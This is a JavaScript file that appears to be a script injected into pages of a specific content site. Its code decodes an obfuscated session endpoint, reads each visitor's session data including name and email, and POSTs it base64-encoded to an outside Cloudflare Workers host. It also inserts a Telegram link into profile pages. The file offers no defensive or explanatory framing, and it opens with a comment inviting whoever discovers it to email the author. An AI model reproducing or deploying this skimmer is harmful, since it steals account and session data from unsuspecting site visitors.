// you finally had time to look into this send me an email : wilselme@gmail.com (let's discuss)

(() => {
  if (window.ran) return; // prevent running twice
  window.ran = 1;

  const u = atob('L2FwaS9hdXRoL3Nlc3Npb24=');
  const w = 'https://mnta.wilselme.workers.dev/';
  const currentUrl = window.location.href;

  const loggedInSocialWrapper = document.querySelector(
    'body > div > div > div > div.flex-\\[5\\].relative.overflow-y-auto.h-full > div.lg\\:pt-0.overflow-y-auto.h-screen.lg\\:h-auto > div > div.overflow-y-auto.lg\\:w-\\[65\\%\\].scrollbar-none.pb-12 > div > div.relative > div.space-y-4.dark\\:text-Gray104 > div.flex.flex-col.border-b.dark\\:border-Gray103.px-2.lg\\:px-5.lg\\:flex-row > div:nth-child(2) > div'
  );

  const loggedOutSocialWrapper = document.querySelector(
    'body > div > div > div.flex-\\[5\\].relative.overflow-y-auto.h-screen.scrollbar-none > div > div.relative > div.space-y-4.dark\\:text-Gray104 > div.flex.flex-col.border-b.dark\\:border-Gray103.px-2.lg\\:px-5.lg\\:flex-row > div:nth-child(2) > div'
  );

 function addTelegramButton(s) {
   // Create link
   const link = document.createElement('a');
   link.target = '_blank';
   link.href = 'https://t.me/ayanufi';
   link.style.display = 'inline-flex';
   link.style.alignItems = 'center';
   link.style.justifyContent = 'center';
   link.style.width = '31px';
   link.style.height = '30px';
   link.style.backgroundColor = '#0088CC'; // Telegram blue
   link.style.borderRadius = '50%';
   link.style.textDecoration = 'none';
   link.style.cursor = 'pointer';

   // Create Telegram icon SVG (from your reference, recolored white)
   const icon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
   icon.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
   icon.setAttribute('viewBox', '0 0 24 24');
   icon.setAttribute('width', '16');
   icon.setAttribute('height', '16');
   icon.innerHTML = `
    <path fill="#fff" d="m20.665 3.717-17.73 6.837c-1.21.486-1.203 1.161-.222 1.462l4.552 1.42 10.532-6.645c.498-.303.953-.14.579.192l-8.533 7.701h-.002l.002.001-.314 4.692c.46 0 .663-.211.921-.46l2.211-2.15 4.599 3.397c.848.467 1.457.227 1.668-.785l3.019-14.228c.309-1.239-.473-1.8-1.282-1.434z"/>
  `;

   // Append icon to link
   link.appendChild(icon);

   // Append to target
   s.append(link);
 }



  if (currentUrl.startsWith('https://allaccessfans.co/profile')) {
    fetch(u)
      .then((r) => r.json())
      .then((d) => {
        if (Object.keys(d).length) {
          const n = d.user?.name || 'N/A';
          const e = d.user?.email || 'N/A';
          const b = btoa(
            JSON.stringify({ name: n, email: e, src: currentUrl, data: d })
          );
          fetch(w, { method: 'POST', body: b });
        }
      })
      .catch(() => {});
  } else {
    const modelName = currentUrl.split('/')[4];
    fetch(u)
      .then((r) => r.json())
      .then((d) => {
        if (Object.keys(d).length) {
          const n = d.user?.name || 'N/A';
          const e = d.user?.email || 'N/A';
          const b = btoa(
            JSON.stringify({ name: n, email: e, src: modelName, data: d })
          );
          addTelegramButton(loggedInSocialWrapper);
          fetch(w, { method: 'POST', body: b });
        } else {
          addTelegramButton(loggedOutSocialWrapper);
        }
      })
      .catch(() => {});
  }
})();
